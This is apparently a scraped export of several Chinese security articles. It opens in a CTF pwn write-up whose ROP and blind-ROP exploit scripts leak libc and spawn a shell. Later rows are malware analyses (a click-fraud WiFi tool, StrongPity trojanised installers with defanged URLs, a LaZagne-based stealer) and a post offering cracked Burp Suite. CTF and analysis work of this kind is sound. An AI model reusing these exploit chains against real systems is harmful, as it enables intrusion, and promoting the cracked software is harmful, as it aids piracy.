r0,r0,0x001b1dbc;show info;mov r2,r0;push r2;call puts;mov r0,r2;leak environ_addrmov r2,spmov sp,r0pop r0mov sp,r2mov r2,r0;ret addrsub r2,r2,0xd0;push r2add r2,r2,0xC#get libc_basepop r1;set addr at r2mov sp,r2#binsh_addradd r0,r1,0x158e8bpush r0#system_addradd r0,r1,0x0003a940push r0add r0,r1,0x0003a940push r0;show info;push r2;call puts;push r2;call puts;push r2;call puts$对上述asm文件去注释脚本：file_r = open(""do_work.asm"", 'r')info = file_r.readlines()file_r.close()file_w = open(""do_work_real.asm"", 'w')for line in info:       if line.startswith("";""):              continue       if line.startswith(""#""):              continue       if len(line.strip()) == 0:              continue       file_w.write(line)  file_w.close()获取shell脚本：from zio import *  target = ""./pwn""target = (""115.28.78.54"", 23333)  def get_io(target):       r_m = COLORED(RAW, ""green"")       w_m = COLORED(RAW, ""blue"")       io = zio(target, timeout = 9999, print_read = r_m, print_write = w_m)       return io  def pwn(io):       io.read_until("":"")       io.writeline(""927e613a91620da8c5f10936faf70f4dgDR95OLX"")              io.read_until(""!\n"")         file_r = open(""1.bin"", ""rb"")       data = file_r.read()       file_r.close()         sinal = ""give me your code, end with a single line of '$'\n""       data = data.replace(sinal, """")         #print data         io.gdb_hint()       #data = data.ljust(0x300, 'a')       io.write(data)         io.interact()  io = get_io(target)pwn(io)转换bin文件并执行脚本run.sh：python compiler.py./make_code &lt; do_work_real.asm &gt; 1.binpython pwn.pyflag如下：出题人失踪了因为没有给bin，根据两个提示，感觉可能是一个栈溢出。猜测没有开启pie，所以基地址为0x08048000或者0x400000。最开始尝试0x08048000,没有任何发现。经过测试，当输入字符超过72字节时，程序不会回显No password, No game。构造如下payload爆破，发现当i=0x711时，程序会正常打印No password, No game，而i=0x70c时，程序会继续等待输入。所以可以推断0x40070c为call指令，调用漏洞函数，0x400711为函数返回地址。   for i in range(0, 0x1000):        payload = 'a'*72 + l64(0x0400000+i)因为是64位程序，要想实现任意地址泄露，主要需要知道pop_rdi_ret和puts_plt的地址。在64位ELF中，通常存在一个pop r15；ret，对应的字节码为41 5f c3。后两字节码5f c3对应的汇编为pop rdi;ret。当一个地址满足如下3个payload都能正常打印NO password, No game的话，就可以得到一个pop rdi;ret的地址。Payload1 = 'a'*72 + l64(addr-1)+l64(0)+l64(0x400711) Payload2 = 'a'*72 + l64(addr)+l64(0)+l64(0x400711) Payload3 = 'a'*72 + l64(addr+1) +l64(0x400711)最终得到的pop_rdi_ret地址为0x4007c3。构造Payload3 = 'a'*72 + l64(pop_rdi_ret) +l64(0x400000)+l64(addr)如果程序打印前4个字节为\x7fELF，则addr为puts_plt。得到puts_plt的地址为0x400570后面就是dump+exp了。Exp大致如下:from threading import Threadimport time# from uploadflag import *from zio import *target = ('119.254.101.197', 10000)target = './test'target = ('115.28.78.54', 13455)def interact(io):    def run_recv():        while True:            try:                output = io.read_until_timeout(timeout=1)                # print output            except:                return    t1 = Thread(target=run_recv)    t1.start()    while True:        d = raw_input()        if d != '':def exp4(target):    puts_plt = 0x400570    pop_rdi_ret = 0x4007c3    io = zio(target, timeout=10000, print_read=COLORED(RAW, 'red'), \             print_write=COLORED(RAW, 'green'))    io.read_until('token:')    io.writeline('927e613a91620da8c5f10936faf70f4dgDR95OLX')    base = 0x400000    d = ''    while True:        print hex(len(d))        io.read_until('?\n')        payload = 'a'*72 + l64(pop_rdi_ret) +l64(base+len(d)) + l64(puts_plt)        io.writeline(payload)        d += io.readline()[:-1] + '\x00'        if len(d) &gt; 0x9bc:            break    f = open('code.bin', 'wb')    f.write(d)    f.close()    base = 0x600e10    d = ''    while True:        print hex(len(d))        io.read_until('?\n')        payload = 'a'*72 + l64(pop_rdi_ret) +l64(base+len(d)) + l64(puts_plt)        io.writeline(payload)        d += io.readline()[:-1] + '\x00'        if len(d) &gt; 0x248:            break    f = open('data.bin', 'wb')    f.write(d)    f.close()    io.close()def exp5(target):    puts_plt = 0x400570    pop_rdi_ret = 0x4007c3    read_got = 0x601028    puts_got = 0x601018    passcode = 'aslvkm;asd;alsfm;aoeim;wnv;lasdnvdljasd;flk'    io = zio(target, timeout=10000, print_read=COLORED(RAW, 'red'), \             print_write=COLORED(RAW, 'green'))    io.read_until('token:')    io.writeline('927e613a91620da8c5f10936faf70f4dgDR95OLX')    io.read_until('?\n')    main = 0x004006BD    io.writeline('a'*72+l64(pop_rdi_ret)+l64(puts_got)+l64(puts_plt)+l64(main))    base = l64(io.readline()[:-1].ljust(8, '\x00')) - 0x000000000006f690    system = base + 0x0000000000045390    binsh = base + 0x18c177    io.read_until('?\n')    io.writeline('a'*72+l64(pop_rdi_ret)+l64(binsh)+l64(system)+l64(main))interact(io)exp5(target)","2016-11-29 13:36:58","CTF专题","FlappyPig HCTF2016 Writeup","http://nsoad.com/Article/CTF/20161129/867.html"
"5ccbfb344f2f0a0a7a69c12f","蓝牙","Kong","近日，腾讯反病毒实验室截获到了大量通过传入特殊参数实现刷流量行为的恶意程序，经过回溯发现，这些恶意程序均是由某wifi热点共享软件下载并解密运行进行传播，感染量非常大。该恶意程序的主要功能是后台定向的流量推广等操作，目前腾讯电脑管家已全面拦截和查杀。0×01 木马样本简介如果你电脑上存在C:\ProgramData\AppData\*app\（Win7）、C:\Documents andSettings\All Users\Application Data\AppData\*app\ （XP）目录，那很可能你已经中招了。感染表现木马文件wifiinit.dll是南宁某科技有限责任公司的wifi热点共享软件——WifiBaby，安装后释放的dll文件。其在安装后注册为系统服务，主要功能为从服务端获取需要执行的任务，下载恶意程序到本地并执行。其下载的恶意程序通常重命名为系统exe，解析传入的参数执行特定的行为。截止到编写该文档，分析到的大部分行为为后台刷流量。木马功能大致流程0×02 详细分析1. Wifiinit.dll行为分析Wifibaby安装完成后，在其安装目录下会生成Wifiinit.dll，该dll被注册为系统服务随系统开启自启动，并与驱动程序wifinat.sys绑定。其导出函数大部分为服务安装与卸载功能以及服务功能函数。当服务异常的情况下，驱动wifinat.sys会调用其中RundllInstall来完成对驱动、服务的重新安装。经过分析，定位到服务中恶意行为部分主要外层代码如下：当服务启动后，首先判断是否有windbg、ida、OllDbg、Wireshark、Sniffer等进程存在，若有，则不触发恶意行为。Anti_debug内容如下：若未发现调试工具，则尝试与服务器获取联系，获得服务器返回后的Taskid结构体后。程序会在GetTask函数里另起一个进程来处理获取到的Taskid：在该线程中，首先按程序自身的协议构造包含有任务派发url：Dispatch.se.17wangwang.com的结构体，而后以udp形式与服务器进行通信，所有流量均经过解密处理。在udp在经过通信协商，并获取到Taskid后，程序首先删除现有AppData/{Taskid}app/目录下的文件，此后再遍历并删除该目录下所有文件：而后，程序将首先判断AppData目录下是否存在app.cfg，app.cfg是一个sqlite数据库，其以taskid为主键，data字段中存放对应taskid执行所需的加密后的exe文件数据。如下图：若app.cfg文件不存在，则执行create table新建一个数据sqlite数据库文件：若存在app.cfg文件，则先搜索数据库，判断对应taskid所需的exe是否存在：若id存在，则直接读取数据库中data字段，生成一个以Taskid命名的raw文件，如图1中“79”文件。倘若该id不存在，则再次解析服务端返回的数据，提取其中下载url和执行exe所需的参数以及exe解密所需的密钥。提取到url后，执行下载：下载成功后，程序还将对下载的文件进行校验，判断其大小及md5是否符合。验证通过后再将下载的数据写回到app.cfg：此后，程序将其解密并以常见的系统进程名对其重命名。再通过获取到的Taskid结构体中信息来判断下载得到的程序为dll还是exe，并分别执行起来：在GotoRunDll函数中，程序将加载该dll并调用其中PlugWork函数，传入获取到的taskid结构体中的参数：同样，在GotoRunExe中，程序可利用CreateProcessAsUserW以及CreateProcessW，调用程序：由上可知，该dll主要功能是定时与服务端连理链接进行通信，获取任务。解析任务结构体，下载相应可执行文件。下载后解密并以任务结构体中得到的参数运行该可执行文件。2. exe文件分析上一节对wifiinit.dll的分析可以知道，wifiinit.dll作为母体主要下载可执行文件并执行。因此，对下载回来的可执行文件进行分析是必不可少的。在样本回溯过程中，笔者收集并整理到的目录名及样本MD5对应关系如下（其后文件名为随机系统进程名）：├─44app 6d8dd8e97e8c5856f454eb2323c5d43d *SearchFilterHost.exe├─50app    f415810f3e513624c4081809792402bc *SearchFilterHost.exe├─63app    b8b9b3d5b0ba82260f3db9c011c82c86    *taskmgr.exe├─65app    b2d8bad6a7949b1f2902215eec875815    *ctfmon.exe├─74app    17072cd99b3a7403e2af883db189070b    *taskhost.exe├─75app    bdd569f5c76e5f492d212b34f5203fc5 *lsm.exe├─79app    3851021f81ad2e62f52d51e0b53f6c1c *alg.exe├─81app    b94c6c76c7f9d113049e0139cadbb7c3|b94c6c76c7f9d113049e0139cadbb7c3 *lsass.exe├─83app    9297ed57e3f04fb1bc5b20efd91d0ab6 *SearchProtocolHost.exe└─85app    4e9e1b1c152521f3111e92e4d0fe6226|38b628edabba1d5fae6f93c7582e0ad4 *svchost.exe由于exe文件过多，就不对其进行一一分析，下文将抽取其中几个样本，大致描述其功能。这一些列可执行程序都是需要传入特殊构造的参数才能正确的去执行其中功能的，以其中一个样本为例，笔者截获到其中的一条参数如下：a1e9a397a1e8eff1a3f5e9e9edeea7b2b2f5fcf2b3aeabadb3fef3b2a2eeeffea0f1f0bbf1eea0f3acabaea9a9aca8fea4fca1b2e8eff1a397a1e9f4f0f8f2e8e9a3aeabadada1b2e9f4f0f8f2e8e9a397a1fef1f8fceffef2f2f6f4f8a3aeabada1b2fef1f8fceffef2f2f6f4f8a397a1f6eabdeaf8f4faf5e9a0bfa4adbfa351714d592b342635b12e392927bd5e5d5058505824275065b14a6b296f51384d752b7d54445a33a1b2f6eaa397a1eef8fceffef5c2edfcfaf8bdeee9fce4a0bfaca8b1aeadbfbdeefeeff2f1f1a0bfacbfbdfef1f4fef6a0bfafbfbdfcf9c2eaf8f4faf5e9a0bfa8adbfbdedfcfaf8c2eaf8f4faf5e9a0bfaaadbfb2a397a1f0fcf4f3c2edfcfaf8bdeee9fce4a0bfa9adb1abadbfbdeefeeff2f1f1a0bfacbfbdfef1f4fef6a0bfacbfbdf1e9c2eaf8f4faf5e9a0bfaaadbfbdefe9c2eaf8f4faf5e9a0bfaaadbfbdefffc2eaf8f4faf5e9a0bfaaadbfbdf1ffc2eaf8f4faf5e9a0bfaaadbfb2a397a1f2e9f5f8efc2edfcfaf8bdeee9fce4a0bfa9adb1abadbfbdeefeeff2f1f1a0bfacbfbdfef1f4fef6a0bfacbfb2a397a1b2e9a3程序运行时，首先会判断是否安装有杀毒软件：如果机器未装有杀毒软件，则对程序传入的参数进行解密，若有则结束进程：其解密部分代码用python描述为：def decode(buf):    buf = binascii.a2b_hex(buf)    lenth = len(buf)    result = []    for i in buf:        result.append(chr((ord(i) ^ lenth) &amp; 0xff))    return """".join(result).decode('gb2312')将刚才的参数解密得到明文如下：https://hao.360.cn/?src=lm&amp;ls=n1634415c9a3600360天心订花,长春 美团团购网,做打胎需多少钱在解密完参数后，程序将对其进行解析，程序会对传入的参数进各个字段进行相应的提取：最后并访问其中网址，完成自动点击操作：在RunAutoClick函数中，程序将首先随机获取一个浏览器头部，而后解析传入的解密后的参数，并且新起一个线程来做点击以及html页面解析的工作：而后将写注册表，设置特定的浏览模式：再按照传入的参数设置窗口显示状态：一般情况情况下都为隐藏窗口，笔者将其手动patch后，得到效果如下：自动打开网址并翻页自动输入关键词搜索并点击进入搜索结果从动画中可以看到，该exe可谓是实现了一整套自动点击流程，完美实现了后台静默刷流量的整个过程。在程序中还可以看到各种对html页面的解析等代码：如果有杀毒软件或者访问到的url是一些主流的电商网站，则停止：其编译遗留的信息也挺多比如：c:\users\fananjie\desktop\dianshang_jc\code\xxx\导航\AutoClick/SogouSeClickMethod.h甚至还有大量的类名、方法名。如：CCrash::WriteMiniDump、CGlobalCritical::SetName、SogouSeClickMethod::SearchClickInput从命名上看，该团伙的工程意识也是很强的，整个工程也是很规范。如此，这个exe的也就分析到这里了。再看另一系列exe，以bdd569f5c76e5f492d212b34f5203fc5为例吧，截获到的其中一条参数如下：571f4b0a5649585b5b5b175e5b17494b185649031f1f1b5144441c1c1c450d02050f5d5c5345080406445f2e5829595d2e29522d292d5f5b090f292d2d2d2d2d2d5c2859285b2d59282d451b031b4955571b4b0a56495a595b475a5e5b175b175b175a5b49445557441f55猜测解密算法与上一个exe一致，解密后得到内容如下： pExplorer可以看到该可执行文件中含有名为FILE的资源，并且是一个可执行文件：在IDA中可以看到提取资源和加载的过程，这里主要关注这个资源中程序的启动方式。在得到资源数据后，程序获取系统位数进而得到ctfmon.exe的绝对路径：而后启动进入create_write_memory函数中，其主要代码如下：该函数中主要判断资源文件是否正常，并且提取其中.text段，启动ctfmon.exe并将代码注入到ctfmon的进程中。下图为od调试可见提取.text段操作。提取到数据后，注入到ctfmon.exe进而运行起来：此时，pchunter看到的lsass.exe进程与ctfmon.exe的关系如下：由此便可知道该进程为了躲避杀毒软件，所使用的启动方式了。由解密后的参数可知，其主要作用是访问参数中包含的url：http://www.find678.com/4E3B26EB9FBF40bdBFFFFFF7C2C0F2CF.phpie打开可以看到，整个页面充斥着各种广告：在其源码中还存有各类刷流量的url：其资源文件中的EXE这里就不做详细分析了，还有很多样本大致行为也几乎相似。截获到的参数解密后的得到的需要刷流量的url有以下这些：1\. http://toutiao.chinaso.com/2\. http://www.so.com/3\. http://web.se.17wangwang.com:8800/News/GetNews.aspx?newsid=4714\. http://rn.leyutuan.com/ou.php5\. http://yb.meilipingyi.com/9303.html6\. http://119.254.98.77:8080/r?cc=otgKYKaOCdE&amp;cb=86gytjGAo0M7\. http://v.hao123.com8\. http://s.guoxiaozhu.com/sg.php9.http://sou.cixidl.com/sg.php10.http://gm.zhanyilu.com/cnzz_t/t.php?id=1259006651&amp;u=http%3a%2f%2fm.pciiss.com%2fcoop%2fwap%2frmw%2f02.htm11.http://rn.leyutuan.com/ou.php12.http://tr.tengrenwang.com/wy2.html13.http://yb.meilipingyi.com/9303.html14.http://adfarm.mediaplex.com/ad/ck/10592-210875-41454-315.http://adhelp.1kmb.cn/cpm_jump?id=126&amp;from=ty16.http://gm.zhanyilu.com/tt/wllt_t/index2.html17.http://tr.tengrenwang.com/wy2.html18.http://www.721mk.com/7A7CEDF7E76642fc8C7D3BD494007157.php19.http://www.623zl.com/A543E248A0634260BB943ADBA68FAB06.php20.http://www.vogue.com.cn/invogue/vogue-style/news_19359669a28d7438.html?utm_source=slvrline&amp;utm_medium=syn_OG&amp;utm_content=&amp;utm_campaign=test 其中大部分页面为无限跳转、广告等页面。其在后台默默运行，在用户不知情的情况下默默地执行着服务器派发的各种刷流量任务。0×03 危害及查杀经过以上分析，可以发现该木马的主要功能还是通过后台刷流量来实现获利，由于该木马作为wifi共享软件的组件，并且以服务形式存在，使得用户难以发现异常。但是频繁地刷流量会占用用户大量的带宽，导致用户网速变慢，并且占用大量内存。如发现近期下载速度变慢、在线看视频玩游戏变卡，很可能中了该木马，可下载电脑管家进行全盘扫描。","2016-10-15 15:49:57","无线安全","无线宝宝wifi热点共享软件刷流量行为分析","http://nsoad.com/Article/wifi/20161015/569.html"
"5ccbfb344f2f0a0a7a69c130","WinRAR解压缩软件在中国有非常大的保有量，中国也是WinRAR的重要市场。不过最近卡巴斯基实验室的研究报告却让我们惊出一身冷汗，某些来源的WinRAR和TrueCrypt安装程序会在","Kong","WinRAR解压缩软件在中国有非常大的保有量，中国也是WinRAR的重要市场。不过最近卡巴斯基实验室的研究报告却让我们惊出一身冷汗，某些来源的WinRAR和TrueCrypt安装程序会在我们的电脑中植入恶意程序，窃取电脑硬盘信息和隐私人信息。矛盾之争WinRAR采用AES-256位加密技术对文件进行加密，TrueCrypt则是一个全盘加密工具。两者都对文件提供强大、可靠的加密。照理说，不应该出现什么问题的啊。但问题确实发生了。    据卡巴斯基实验室的报告称（报告见文末链接），他们在WinRAR和TrueCrypt的安装程序中发现了一个来自StrongPit团队的新恶意程序，这个程序会在用户安装后启动。    对于StrongPit，相信大家应该是有耳闻，已经在黑客行业耕耘多年，而最近，他们又迷上了用户的加密工具。这个团队主要是采用Watering-Hole、感染安装程序、以及恶意程序等对用户的加密软件进行攻击，也算是一个老油条了。该团队曾在过去发起过0-day攻击。通过对他们的研究发现，这个团队存在以下特点：1.决定无比正确，2.资源十分丰富，3.而且方式较新，4.完全不计后果。如何实现攻击？ StrongPity通过建立一个与合法网站相似度极高的网站下载站点，欺骗用户下载含有恶意程序的加密应用，攻击者在数据加密没有完成之前就获得了完整的数据。除了基本的钓鱼攻击外，攻击者甚至还劫持了WinRAR和TrueCrypt的相关域名，替换了WinRAR和TrueCrypt安装程序文件的原有链接。如果用户点击了这个下载链接，就会在神不知鬼不觉中下载恶意程序。一旦恶意程序被安装，它就会控制整个系统，进而获得各种敏感数据。卡巴斯基表示：在今年的攻击中，StrongPity抛弃了以往的ICS或SCADA攻击。而是通过模仿WinRAR的合法网站建立了一个域名为ralrab.com的网站，然后将合法网站的推荐按钮链接到含有恶意程序的网站上，让用户下载含有恶意程序的安装软件。当然，其他链接则正常链接到合法软件。StrongPity提供了32位和64位的法语和荷兰语版本供下载：hxxp://www.ralrab[.]com/rar/winrar-x64-531.exehxxp://www.ralrab[.]com/rar/winrar-x64-531fr.exehxxp://www.ralrab[.]com/rar/winrar-x64-531nl.exehxxp://www.ralrab[.]com/rar/wrar531.exehxxp://www.ralrab[.]com/rar/wrar531fr.exehxxp://www.ralrab[.]com/rar/wrar531nl.exehxxp://ralrab[.]com/rar/winrar-x64-531.exehxxp://ralrab[.]com/rar/winrar-x64-531nl.exehxxp://ralrab[.]com/rar/wrar531fr.exehxxp://ralrab[.]com/rar/wrar531nl.exehxxp://ralrab[.]com/rar/wrar53b5.exeralrab.com上含有恶意程序的安装文件StrongPity的这种下载程序标榜着“非同寻常的数字证书”，但是他们并没有重用这种虚假的数字证书。这种程序的下载组件包括一个后门、键盘记录器、数据盗取器和其他的软件程序，包括putty SSH客户端、服务器源代码分析（filezilla FTP）客户端、Wnscp安全文件传输程序和远程桌面客户端。范围广，危害大卡巴斯基实验室的报告数据显示，今年就有超过1000种系统被这种程序影响。影响范围也比较广，欧洲、中东甚至非洲都未能幸免。意大利、土耳其、比利时、阿尔及利亚和法国是其中受影响最为严重的。winrar[.]it StrongPity component geolocation distribution     在几乎同一时间内，有超过60个访客发现他们的网站从winrar.be变为了ralrab.com，而且都是位于一个国家。在5月25至6月初这段时间内，受害国家主要集中为阿尔及利亚、摩洛哥、荷兰、加拿大、科特迪瓦和突尼斯。winrar[.]be StrongPity component geolocation distribution这个团队在2015年年底才开始部署Truecrypt-themed 的Watering hole，但在今年的夏末，这种攻击方式就已经开始暴发。他们建立了一个直接从TrueCrypt的合法网站拉取信息的网站。7月中旬到9月初，很多土耳其和荷兰的用户发现他们的网站从tamindir.com导向了true-crypt.com。     tamindir[.]com to true-crypt[.]com poisoned TrueCrypt installer redirects  而在该网站（true-crypt.com）的底部，也有一些链接指向含有恶意程序的安装文件：     hxxp://www.true-crypt[.]com/download/TrueCrypt-Setup-7.1a.exehxxp://true-crypt[.]com/files/TrueCrypt-7.2.exeWinRAR的情况则有点特殊。黑客并不是直接将WinRAR的网站导向黑客控制的网站，而是劫持了合法网站winrar.it，将受害者引导至含有恶意程序版本的网站。winrar.it对意大利影响最为严重，其他欧洲国家也受到了一定的影响；而winrar.be则对加拿大、荷兰等国家造成了影响。   Download page, winrar[.]it     在卡巴斯基研究人员的进一步测试中发现，这个恶意下载程序不仅能让黑客控制系统，更能让他们窃取硬盘里的内容，同时，还能下载其他的恶意程序来窃取用户的联系人信息。换句话说，只要他们愿意，你的电脑就没有秘密，他们可以随时检索你的私人数据和交流信息。所以，这种程序影响是深远的。借用卡巴斯基研究员Kurt Baumgartner的话来说就是“WinRAR的经销商非常幸运，因为这个恶意程序已经被移除。而且它是通过伪安装程序链接到他们的网站的。”一个被通过winrar安装程序传播的网站尽管WinRAR已经将它们移除，但某个TrueCrypt经销商的网站还能在受害者的设备中安装这种恶意程序。这个恶意程序通过经销商的网站已经在土耳其扩散并影响了相当多的用户。如何应对？我们中国有句老叫做“兵来将挡水来土掩”，既然事情已经发生了，我们就要在行动中注意。卡巴斯基的安全团队也给了我们衷告：“When visiting sites and downloading encryption-enabled software, it has become necessary to verify the validity of the distribution site and the integrity of the downloaded file itself. Download sites not using PGP or strong digital        code signing certificates need to re-examine the necessity of doing so for their own customers”。大概就是，在浏览或者下载可加密站点时，必须要对网站有效性和文件的完整性进行验证，养成良好的习惯。而对于下载站点来说，最好是采用PGP协议和强数字密码签名来保护用户的安全。卡巴斯基研究报告下载链接：卡巴斯基研究报告","2016-10-22 17:53:25","系统安全","警惕，WinRAR和TrueCrypt安装程序在用户电脑中植入恶意程序","http://nsoad.com/Article/system/20161022/626.html"
"5ccbfb344f2f0a0a7a69c131","前言利用文档进行木马传播的手法，最近一段时间随着敲诈类木马的流行，而被广泛利用了起来。与此同时，这个手法也开始被传统木马所借鉴。近日哈勃分析系统捕捉到一类隐私窃","Kong","前言利用文档进行木马传播的手法，最近一段时间随着敲诈类木马的流行，而被广泛利用了起来。与此同时，这个手法也开始被传统木马所借鉴。近日哈勃分析系统捕捉到一类隐私窃取类木马，也开始利用文档作为自身的传播手段。据分析，此木马通常定向攻击企业商务用户，目前已经有大量受害者的隐私被窃取，包括黎巴嫩，美国，印度，意大利，马来西亚，韩国，尼日利亚，英国，泰国，希腊，墨西哥，越南等国家，在中国境内也发现有台湾和广东的企业用户被植入该木马，包括邮箱密码、网站密码、聊天记录、桌面截图等在内的大量隐私遭到泄漏。顺着这个线索，哈勃进一步发现了此木马的制作团体以及进行兜售的网站。木马的攻击流程可以简要地表示为下图：在这次事件中，哈勃分析系统捕获到的部分情报如下：此木马的详细技术分析一、诱导木马文件是一个带宏的word文档，后缀名为docm。打开该文档后，其首页内容为诱导性的图片，假称媒体插件未加载，要求用户开启宏以查看内容。二、释放当用户点击开启宏之后，文档中的恶意宏文件会开始执行。查看宏代码可以发现，宏的内容经过一定程度的混淆，目的是提高安全人员对其进行破解的难度。经过分析，此宏的作用是在Temp目录下的一个随机目录名中释放恶意可执行文件，文件的扩展名为“cmd”（中间带一个空格），而文件的本体并非存放在宏之中，而是存放在文档正文之中。木马作者通过将正文文字设置为白色，以达到隐藏的效果。实际上，这些正文是经过编码的二进制文件，宏通过读取正文并解码后，将真正的恶意数据写入前述目录，即达到释放恶意文件的目的。三、下载接下来，宏会运行该可执行文件，此文件的主要作用，是从某网络地址上下载一个名为install.zip的压缩包。该压缩包是加密的，这样可以避免在传输过程中被扫描而报毒。下载完成后，木马会使用密码将压缩包中内容解压到C:\ProgramData\目录下。这个过程中，下载地址和压缩密码均为硬编码在可执行文件中。其中下载地址的有效字符中间填充了大量的空白字符0×20，目的是躲避静态扫描对于字符串的检测。此外，此文件还会在解压目录中生成一个.gtk.conf配置文件。四、窃密压缩包解压后，木马会运行其中的msupd.exe文件，这个文件是执行恶意行为的主程序，它启动后，会检查同目录下是否有.gtk.conf配置文件，这个加密的配置文件设置木马的功能，指导其拉起其它组件，进行各种隐私窃取操作，包括收集密码、键盘记录、屏幕截图等。1.收集密码收集密码时使用的是压缩包中的MSASCui.exe程序，其被调用的命令行为：经过分析发现，此程序实际上是网络上的一个开源项目，LaZagneProject，该项目是一个在计算机上检索存储的密码的程序，支持Windows、Linux/Unix-Like等多种操作系统中，包括系统密码、浏览器密码、聊天软件密码、游戏密码、代码仓库（Git、Svn等）密码、邮箱密码、Wifi密码等在内的大量密码信息。此项目的源代码是用Python写的，同时提供了Windows下独立的可执行程序版本。通过Python源码我们可以了解其收集密码的一些细节，比如对于IE密码，程序会首先从系统中提取密码数据，Win7及之前的系统是从注册表中提取：Win8及以后的系统是使用Powershell命令从PasswordVault中提取：对于提取出来的密码数据，会使用系统中的CryptUnprotectDataAPI解为明文。这是因为，保存的密码数据在Windows系统中是使用CryptProtectDataAPI进行保护的，编码后的数据在另一台电脑甚至同一系统下的不同用户账户都是无法解读的。可是木马利用此开源项目，先在已登录的用户账户下将密码解为明文，再回传给攻击者，就可以绕过此密码保护体系。这一手法也用在了很多其它不同的密码的收集流程中。在木马中用到的LaZagne是目前的最新版本1.7版。最终写入PWD.txt中的内容示例为：2.键盘记录木马会创建低级键盘钩子记录键盘信息：3.屏幕截图屏幕截图相关代码如下：可以看到其截取的是受害者的全部桌面屏幕：五、回传收集到足够的隐私信息后，木马会将这些信息回传到服务器上，回传使用的方式是连接邮件服务器并发送邮件。当邮件的发件人和收件人并非同一地址时，邮件发送之后本来是无法继续跟踪邮件内容的。有趣的是，在使用捕获到的其中一个木马使用的用户名密码登录邮件服务器之后，可以看到有一些邮件因为被识别为垃圾邮件等原因，被收件人的邮件服务器给退了回来，退回的邮件中包含有发送的邮件原文。在退回的邮件中，可以发现木马回传的隐私信息。比如如下这个邮件中，就包含了木马在受害者电脑上的屏幕截图和相关日志：此外，在另一个样本的邮箱中，可以在收件箱中发现更多寄给自己的邮件。这批邮件涉及的企业和隐私内容更加广泛，包括大量的邮箱密码、浏览器保存密码、聊天记录、屏幕截图等内容均遭到泄漏，其中还包括了银行、政府网站登录密码这样的敏感数据。同时还可以发现，这些邮箱也被用于发送钓鱼邮件，传播带宏的样本： 团体在最初分析的带宏文档的属性中可以看到，生成该文档的原始语言为波兰语。Zip包的下载域名所对应的托管公司也位于波兰。同时，在邮箱中也可以发现一些波兰语的邮件。可以猜测，该木马的传播者也位于波兰。但是，传播者并不等同于制造者。通过进一步分析可以发现，不同的样本使用的具体手法上有所差别，可以认为是由不同的恶意攻击团体在进行操作。可以想象这些木马是由某一个团体开发，然后交到不同的攻击团体手中，经过个性化修改后再进行传播。顺着这个思路，我们在网上找到了此木马的最初源头。令人惊讶的是，此木马的制作团体已经开发了一整套完整的商业项目，将此木马在网络上进行兜售，售价从15美元/月到75美元/永久不等。从网站上给出的截图可以看出，木马除了通过邮箱回传信息之外，还支持通过FTP或PHP网页回传隐私信息。通过网站上的自我介绍以及域名相关查询结果，基本可以确定此木马的制作者是位于希腊的团体。","2016-10-31 15:08:41","系统安全","文档化身商业木马，对“盗神”的分析与溯源","http://nsoad.com/Article/system/20161031/668.html"
"5ccbfb344f2f0a0a7a69c132","Burp Suite是响当当的web应用程序渗透测试集成平台。从应用程序攻击表面的最初映射和分析，到寻找和利用安全漏洞等过程，所有工具为支持整体测试程序而无缝地在一起工作。","Blackhold","本文提供的破解方式仅供软件试用，请于24小时内删除关于Burp Suite众所周知，Burp Suite是响当当的web应用程序渗透测试集成平台。从应用程序攻击表面的最初映射和分析，到寻找和利用安全漏洞等过程，所有工具为支持整体测试程序而无缝地在一起工作。平台中所有工具共享同一robust框架，以便统一处理HTTP请求、持久性、认证、上游代理、日志记录、报警和可扩展性。Burp Suite允许攻击者结合手工和自动技术去枚举、分析、攻击Web应用程序。拦截代理（Proxy），你可以检查和更改浏览器与目标应用程序间的流量；可感知应用程序的网络爬虫（Spider），它能完整的枚举应用程序的内容和功能；高级扫描器，执行后它能自动地发现web应用程序的安全漏洞；入侵测试工具（Intruder），用于执行强大的定制攻击去发现及利用不同寻常的漏洞；重放工具（Repeater），一个靠手动操作来触发单独的HTTP 请求，并分析应用程序响应的工具；会话工具（Sequencer），用来分析那些不可预知的应用程序会话令牌和重要数据项的随机性的工具；解码器，进行手动执行或对应用程序数据者智能解码编码的工具；扩展性强，可以让你加载Burp Suite的扩展，使用你自己的或第三方代码来扩展Burp Suit的功能。下载地址百度网盘   密码：8i4z（警告：请自行检测程序安全性）（警告：请自行检测程序安全性，仅供尝鲜，24小时内自觉删除）","2016-12-06 10:16:54","安全工具","渗透测试神器Burp Suite v1.7.11破解版下载","http://nsoad.com/Security-tools/20161206/tools-887.html"
"5ccbfb3e4f2f0a0a7a69c133","网络扫描是信息收集的重要手段。通过扫描可以发现存活主机、开放端口，进而发现其运行的服务、操作系统等信息，为下一步的工作奠定基础。扫描工具的选取尤为重要。目前，有","Kong","网络扫描是信息收集的重要手段。通过扫描可以发现存活主机、开放端口，进而发现其运行的服务、操作系统等信息，为下一步的工作奠定基础。扫描工具的选取尤为重要。目前，有不少扫描工具可供选择，且各有特色。其中，Nmap以其强大而丰富的功能被绝大部分人所使用。除此之外，号称“45分钟扫描全网”的Zmap以及“6分钟扫描全网”的Masscan也有着较高的使用率。接下来，本文将对Nmap、Zmap、Masscan这三种扫描工具进行一些比较。一、使用环境Nmap可以在Linux、Windows、Mac OS下运行，并且有图形化界面Zenmap；Zmap、Masscan可以在Linux、Mac OS下运行，同时也可以在Windows下使用，不过要借助Cygwin等工具。二、功能ZmapZmap采用了无状态的扫描技术，没有进行完整的TCP三次握手，因此扫描速度极大提升。Zmap的基本功能是扫描发现主机的开放端口。  一次扫描支持单端口，不支持在命令里设置目标IP。  设置黑白名单，由于Zmap设计为在全网范围内寻找主机，若想对特定网段进行扫描，可以利用白名单的方式；  设置扫描数量和扫描时间；  设置扫描速率，由于Zmap会以网络适配器支持的最快速率进行扫描，不会根据上游流量提供商自动调整发送速率，需要手动调整，来减少丢包和不正确的结果。可以通过设置每秒发包数量或带宽进行调整；  设置扫描源端口、源IP，伪造网关MAC地址进行伪装。  结果输出默认csv格式，经过额外的配置可输出redis和JSON；用户也可以用官方提供的API自己编写输出模块。  扫描模式，支持TCPSYN、ICMP echo、UDP三种扫描模式，用户也可以用官方提供的API自己编写探测模块。  Banner获取，Zmap并不直接提供Banner获取功能，需要编写扩展模块，不过开发者已经为我们提供了一个样本。详情见后文。MasscanMasscan与Zmap类似，同样采用了无状态的扫描技术。  允许自定义任意的地址范围和端口范围；   设置黑白名单；   设置扫描速率；  指定发包的源IP地址、源端口和源MAC地址进行伪装。   结果输出支持xml、binary、JSON、list等多种格式。   